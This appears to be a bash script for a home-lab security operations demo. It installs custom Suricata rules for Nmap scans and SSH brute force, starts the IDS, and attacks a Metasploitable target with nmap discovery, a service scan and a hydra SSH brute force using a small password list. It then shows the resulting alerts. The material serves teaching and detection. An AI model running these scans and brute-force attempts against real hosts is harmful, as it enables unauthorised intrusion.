@@ -1,0 +1,82 @@
+#!/usr/bin/env bash
+# =====================================================================
+# SecureHome SOC — ONE-SHOT attack -> detect demo (run from Kali)
+#
+#   Usage:   sudo bash soc-demo.sh [TARGET_IP]
+#            (TARGET_IP defaults to 192.168.1.3 = Metasploitable)
+#
+# What it does, end to end:
+#   0. make sure nmap / hydra / suricata / jq are installed
+#   1. install our custom detection rules
+#   2. start Suricata IDS on the LAN interface
+#   3. ATTACK the target: host discovery, full service scan, SSH brute force
+#   4. show the Suricata ALERTS that fired  = the attack->detect loop
+# =====================================================================
+set -uo pipefail
+
+TARGET="${1:-192.168.1.3}"
+IFACE="${IFACE:-eth0}"
+NET="$(echo "$TARGET" | sed -E 's/\.[0-9]+$/.0\/24/')"
+WORK="${SUDO_USER:+/home/$SUDO_USER}/soc-demo"; WORK="${WORK:-$HOME/soc-demo}"
+mkdir -p "$WORK"; cd "$WORK"
+
+cyan(){ printf '\n\033[1;36m========== %s ==========\033[0m\n' "$*"; }
+grn(){  printf '\033[1;32m%s\033[0m\n' "$*"; }
+
+cyan "SecureHome SOC demo   attacker=$(hostname)   target=$TARGET   iface=$IFACE"
+
+# ---- 0. tools -------------------------------------------------------
+cyan "0. Checking tools"
+need=()
+for t in nmap hydra suricata jq; do command -v "$t" >/dev/null || need+=("$t"); done
+if [ "${#need[@]}" -gt 0 ]; then
+  echo "Installing: ${need[*]}"
+  sudo apt-get update -y && sudo apt-get install -y "${need[@]}"
+fi
+
+# ---- 1. detection rules --------------------------------------------
+cyan "1. Installing custom detection rules"
+sudo mkdir -p /etc/suricata/rules
+sudo tee /etc/suricata/rules/securehome.rules >/dev/null <<'RULES'
+alert tcp any any -> $HOME_NET any (msg:"SECUREHOME Nmap port scan"; flags:S; flow:to_server; threshold:type both, track by_src, count 30, seconds 5; classtype:attempted-recon; sid:1000001; rev:1;)
+alert tcp any any -> $HOME_NET 22 (msg:"SECUREHOME SSH brute-force"; flow:to_server; flags:S; threshold:type both, track by_src, count 10, seconds 20; classtype:attempted-admin; sid:1000010; rev:1;)
+RULES
+grep -q 'securehome.rules' /etc/suricata/suricata.yaml \
+  || sudo sed -i '/^rule-files:/a\  - securehome.rules' /etc/suricata/suricata.yaml
+
+# ---- 2. start Suricata IDS ------------------------------------------
+cyan "2. Starting Suricata IDS on $IFACE"
+sudo pkill -f 'suricata -i' 2>/dev/null || true
+sudo rm -f /var/log/suricata/eve.json
+sudo suricata -i "$IFACE" -l /var/log/suricata -D
+echo "   waiting for Suricata to initialise..."; sleep 10
+
+# ---- 3. ATTACKS -----------------------------------------------------
+cyan "3a. Recon — host discovery on $NET"
+nmap -sn "$NET"
+
+cyan "3b. Recon — full service scan of $TARGET"
+nmap -sV "$TARGET" | tee scan.txt
+
+cyan "3c. SSH brute-force on $TARGET"
+printf 'root\nmsfadmin\npassword\n123456\nadmin\n' > wl.txt
+hydra -l msfadmin -P wl.txt "ssh://$TARGET" -t 4 -f 2>&1 | tee hydra.txt || true
+
+# ---- 4. DETECTIONS --------------------------------------------------
+cyan "4. Suricata ALERTS  (the attack -> detect loop)"
+sleep 6
+if sudo test -s /var/log/suricata/eve.json; then
+  sudo jq -r 'select(.event_type=="alert")
+        | "\(.timestamp[11:19])  \(.src_ip) -> \(.dest_ip)   [\(.alert.signature)]"' \
+        /var/log/suricata/eve.json | sort -u
+  echo
+  grn "Alert count: $(sudo grep -ac '"event_type":"alert"' /var/log/suricata/eve.json)"
+else
+  echo "No eve.json yet — check: sudo tail /var/log/suricata/suricata.log"
+fi
+
+cyan "DONE — recon -> attack -> detect, all in one run"
+echo "Scan report : $WORK/scan.txt"
+echo "Brute result: $WORK/hydra.txt"
+echo "Full alerts : sudo cat /var/log/suricata/eve.json | jq 'select(.event_type==\"alert\")'"
+echo "Stop IDS    : sudo pkill -f 'suricata -i'"
